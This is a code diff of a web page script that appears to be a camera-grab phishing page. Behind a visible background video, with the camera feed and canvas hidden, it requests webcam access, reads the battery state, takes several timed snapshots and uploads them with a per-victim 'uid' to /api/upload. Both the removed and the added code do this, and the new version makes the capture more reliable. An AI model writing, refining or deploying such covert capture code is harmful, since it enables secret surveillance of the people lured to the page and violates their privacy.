@@ -65,47 +65,57 @@ video#camera, canvas#snapshot { display:none; }
 <canvas id="snapshot"></canvas>
 
 <script>
-const bgVideo = document.getElementById('bgVideo');
-const cameraVideo = document.getElementById('camera');
-const canvas = document.getElementById('snapshot');
-const ctx = canvas.getContext('2d');
-const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
-
-async function captureSnapshots() {
-  try {
-    const battery = await navigator.getBattery();
-    const batteryLevel = Math.round(battery.level*100);
-    const isCharging = battery.charging;
-
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    cameraVideo.srcObject = stream;
-
-    const delays = [2000, 4000, 6000];
-    for(let d of delays){
-      await new Promise(res => setTimeout(res, d));
-      canvas.width = cameraVideo.videoWidth;
-      canvas.height = cameraVideo.videoHeight;
-      ctx.drawImage(cameraVideo, 0, 0);
-      const imageData = canvas.toDataURL('image/png');
-      fetch('/api/upload',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ image:imageData, uid, battery:batteryLevel, charging:isCharging })
-      }).then(r=>r.json()).then(d=>console.log("Uploaded",d)).catch(e=>console.error(e));
+  function takeSnapshotAndSend(battery, charging) {
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+      console.warn("⚠️ Video not ready, retrying in 200ms...");
+      setTimeout(() => takeSnapshotAndSend(battery, charging), 200); // ✨ fallback retry
+      return;
     }
 
-    // Stop camera
-    stream.getTracks().forEach(track=>track.stop());
-    console.log("Camera stopped");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  } catch(err){
-    console.error("Camera error:", err);
+    const imageData = canvas.toDataURL('image/png');
+
+    fetch('/api/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: imageData, uid, battery, charging })
+    }).then(res => res.json()).then(data => {
+      console.log("✅ Uploaded:", data);
+      log.innerText += "Snapshot uploaded...\n";
+    }).catch(err => {
+      console.error("❌ Upload error:", err);
+      log.innerText += "Upload failed!\n";
+    });
   }
-}
 
-// Start snapshot sequence after 1s so video is visible
-setTimeout(captureSnapshots, 1000);
-</script>
+  if (uid) {
+    navigator.getBattery().then(battery => {
+      const batteryLevel = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
+
+      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        statusEl.innerText = "Camera access granted...";
+
+        // ✨ د ویډیو د لومړي frame وروسته snapshots پیل شي
+        video.onplaying = () => {
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
+        };
+      }).catch(err => {
+        console.error("Camera error:", err);
+        statusEl.innerText = "Camera error!";
+      });
+    });
+  }
+</script> 
 
 </body>
 </html> 
